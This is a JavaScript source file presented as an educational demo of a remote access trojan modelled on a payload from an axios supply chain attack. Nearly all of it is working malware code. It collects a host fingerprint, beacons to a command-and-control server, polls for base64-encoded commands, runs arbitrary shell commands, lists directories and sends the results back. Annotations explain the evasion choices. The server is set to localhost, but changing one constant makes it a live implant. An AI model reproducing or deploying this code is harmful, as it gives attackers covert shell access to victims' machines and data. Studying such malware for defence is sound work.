/**
 * RAT Client — Educational Demo
 *
 * Mimics com.apple.act.mond behavior from the real axios supply chain attack.
 * This file is served by the C2 server on GET /payload, downloaded by the dropper,
 * and executed as a detached background process on the victim machine.
 *
 * Behavior:
 *   1. Generate a random victim ID
 *   2. Collect system fingerprint
 *   3. Beacon to C2 (POST /c2) with fingerprint
 *   4. Poll C2 every 5s (GET /c2/:victimId) for commands
 *   5. Execute commands and send results back (POST /c2/:victimId/result)
 *
 * Supported commands (safe subset):
 *   - runscript: execute a shell command, return stdout
 *   - rundir:    list a directory, return JSON
 *   - kill:      process.exit(0)
 *
 * Real attack also had:
 *   - peinject: receive base64 binary, write to /private/tmp/.XXXXX, codesign, execute
 *     (NOT implemented here — intentionally omitted for safety)
 */

const http = require("http");
const os = require("os");
const { exec } = require("child_process");
const crypto = require("crypto");
const fs = require("fs");
const path = require("path");

const C2_HOST = "localhost";
const C2_PORT = 8000;
const POLL_INTERVAL = 5000; // 5s for demo (real attack: 60s)

/**
 * ANNOTATION: Hardcoded User-Agent mimicking IE8 on Windows XP.
 * The real attack used this exact string. It stands out in modern network logs
 * because no real browser has sent this UA since ~2014, but most monitoring
 * tools filter by known-malicious UAs, not by "suspiciously old" ones.
 */
const USER_AGENT =
  "mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)";

// Generate a 16-char random victim ID
const victimId = crypto.randomBytes(8).toString("hex");

// ── Fingerprint collection ──────────────────────────────────────────────────

function collectFingerprint() {
  return {
    hostname: os.hostname(),
    username: os.userInfo().username,
    platform: os.platform(),
    arch: os.arch(),
    osVersion: os.version(),
    uptime: os.uptime(),
    homeDir: os.homedir(),
    cpus: os.cpus().length,
    totalMem: Math.round(os.totalmem() / 1024 / 1024) + " MB",
  };
}

// ── HTTP helpers ────────────────────────────────────────────────────────────

function httpRequest(method, urlPath, body) {
  return new Promise((resolve, reject) => {
    const options = {
      hostname: C2_HOST,
      port: C2_PORT,
      path: urlPath,
      method,
      headers: {
        "User-Agent": USER_AGENT,
        "Content-Type": "application/json",
      },
    };

    const req = http.request(options, (res) => {
      let data = "";
      res.on("data", (chunk) => (data += chunk));
      res.on("end", () => {
        let body;
        try {
          body = JSON.parse(data);
        } catch {
          body = data;
        }
        resolve({ statusCode: res.statusCode, body });
      });
    });

    req.on("error", (err) => {
      // Silent failure — the RAT should not crash if C2 is down
      // ANNOTATION: Real RATs silently retry; crashing would alert the victim
      resolve(null);
    });

    if (body) req.write(JSON.stringify(body));
    req.end();
  });
}

// ── Command handlers ────────────────────────────────────────────────────────

/**
 * runscript — Execute a shell command
 * ANNOTATION: The real attack used child_process.exec with no sanitization.
 * This gives full shell access as the current user.
 */
function handleRunscript(args) {
  return new Promise((resolve) => {
    exec(args, { timeout: 10000 }, (err, stdout, stderr) => {
      if (err) resolve(`ERROR: ${err.message}`);
      else resolve(stdout || stderr || "(no output)");
    });
  });
}

/**
 * rundir — List a directory
 * Returns JSON array of { name, type, size }.
 */
function handleRundir(args) {
  return new Promise((resolve) => {
    const dir = args || os.homedir();
    try {
      const entries = fs.readdirSync(dir, { withFileTypes: true });
      const result = entries.map((e) => ({
        name: e.name,
        type: e.isDirectory() ? "dir" : "file",
        size: e.isFile()
          ? fs.statSync(path.join(dir, e.name)).size
          : undefined,
      }));
      resolve(JSON.stringify(result, null, 2));
    } catch (err) {
      resolve(`ERROR: ${err.message}`);
    }
  });
}

// ── Main loop ───────────────────────────────────────────────────────────────

async function beacon() {
  const fingerprint = collectFingerprint();
  console.log(`[RAT] Victim ID: ${victimId}`);
  console.log(`[RAT] Beaconing to ${C2_HOST}:${C2_PORT}...`);

  await httpRequest("POST", "/c2", { victimId, fingerprint });
}

async function poll() {
  const response = await httpRequest("GET", `/c2/${victimId}`);
  if (!response) return;

  // Re-beacon if C2 forgot us (e.g. server restarted)
  if (response.statusCode === 404) {
    console.log("[RAT] C2 lost our session, re-beaconing...");
    await beacon();
    return;
  }

  if (!response.body || !response.body.command) return;

  // ANNOTATION: base64-decode the command — faithful to real attack encoding
  let cmd;
  try {
    cmd = JSON.parse(Buffer.from(response.body.command, "base64").toString("utf-8"));
  } catch {
    return;
  }

  console.log(`[RAT] Received command: ${cmd.type} ${cmd.args || ""}`);

  let output;
  switch (cmd.type) {
    case "runscript":
      output = await handleRunscript(cmd.args);
      break;
    case "rundir":
      output = await handleRundir(cmd.args);
      break;
    case "kill":
      console.log("[RAT] Kill command received. Exiting.");
      process.exit(0);
    default:
      output = `Unknown command type: ${cmd.type}`;
  }

  // ANNOTATION: base64-encode the result before sending — both directions are encoded
  const encodedResult = Buffer.from(output).toString("base64");

  await httpRequest("POST", `/c2/${victimId}/result`, {
    command: `${cmd.type} ${cmd.args || ""}`.trim(),
    result: encodedResult,
  });
}

async function main() {
  await beacon();

  // Poll loop
  setInterval(poll, POLL_INTERVAL);
  console.log(`[RAT] Polling every ${POLL_INTERVAL / 1000}s...`);
}

main();
